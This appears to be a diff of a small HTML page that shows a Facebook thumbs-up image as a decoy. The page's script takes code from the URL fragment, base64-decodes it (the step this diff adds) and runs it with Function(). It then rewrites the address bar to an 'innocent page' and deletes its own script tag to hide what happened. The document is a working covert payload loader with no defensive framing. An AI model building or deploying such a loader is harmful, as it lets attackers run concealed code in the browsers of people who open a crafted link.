@@ -5,7 +5,7 @@
 <body>
   <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Facebook_Thumb_icon.svg/640px-Facebook_Thumb_icon.svg.png" />
   <script id="a">
-    let payload=decodeURI(document.location.hash.substring(3));
+    let payload=atob(decodeURI(document.location.hash.substring(6)));
     history.pushState({}, 'innocent page', 'hello.html');
     Function(payload)();
     document.getElementById("a").remove();
